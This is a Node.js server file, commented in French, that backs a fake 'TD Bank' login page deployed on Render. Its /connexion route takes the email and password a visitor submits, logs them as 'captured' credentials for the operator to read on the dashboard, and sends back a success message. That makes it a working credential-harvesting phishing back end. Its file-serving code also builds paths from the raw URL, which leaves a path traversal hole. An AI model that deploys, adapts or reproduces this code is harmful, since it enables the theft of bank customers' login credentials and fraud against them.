const http = require('http');
const fs = require('fs');
const path = require('path');

// 🔧 MODIFICATION IMPORTANTE POUR RENDER :
// Render nous donne un port dans process.env.PORT
// Si on est sur notre Mac (pas sur Render), on utilise 3000
const PORT = process.env.PORT || 3000;

console.log('🚀 Serveur TD Bank démarré...');
console.log('📍 Mode:', process.env.PORT ? 'Production (Render)' : 'Local');
console.log('⏳ En attente de connexion...\n');

const server = http.createServer((req, res) => {
    
    // Autoriser les requêtes depuis n'importe où (CORS)
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET');
    
    // 🔴 ROUTE MAGIQUE : Quand quelqu'un clique sur "Se connecter"
    if (req.method === 'POST' && req.url === '/connexion') {
        let body = '';
        
        // On reçoit les données petit à petit
        req.on('data', (chunk) => {
            body += chunk;
        });
        
        // Quand tout est reçu
        req.on('end', () => {
            // Convertir les données du formulaire
            const params = new URLSearchParams(body);
            const email = params.get('email');
            const password = params.get('password');
            
            // 🔥 AFFICHAGE DANS LES LOGS (visible sur Render dashboard)
            console.log('═══════════════════════════════════════');
            console.log('🟢 CONNEXION CAPTUREE');
            console.log('📧 Email :', email);
            console.log('🔑 Mot de passe :', password);
            console.log('🕐 Heure :', new Date().toISOString());
            console.log('═══════════════════════════════════════');
            
            // Répondre au navigateur
            res.writeHead(200, {'Content-Type': 'application/json'});
            res.end(JSON.stringify({
                success: true,
                message: 'Identifiants reçus par le serveur !'
            }));
        });
        
        return;
    }
    
    // Servir les fichiers HTML normalement
    let filePath = './public' + req.url;
    if (filePath === './public/') {
        filePath = './public/index.html';
    }
    
    const extname = String(path.extname(filePath)).toLowerCase();
    const contentTypes = {
        '.html': 'text/html',
        '.css': 'text/css',
        '.js': 'text/javascript',
    };
    
    fs.readFile(filePath, (error, content) => {
        if (error) {
            res.writeHead(404);
            res.end('Page non trouvée');
        } else {
            res.writeHead(200, {'Content-Type': contentTypes[extname] || 'text/html'});
            res.end(content, 'utf-8');
        }
    });
});

server.listen(PORT, () => {
    console.log(`✅ Serveur prêt sur le port ${PORT}`);
    console.log(`🌐 URL locale : http://localhost:${PORT}`);
});
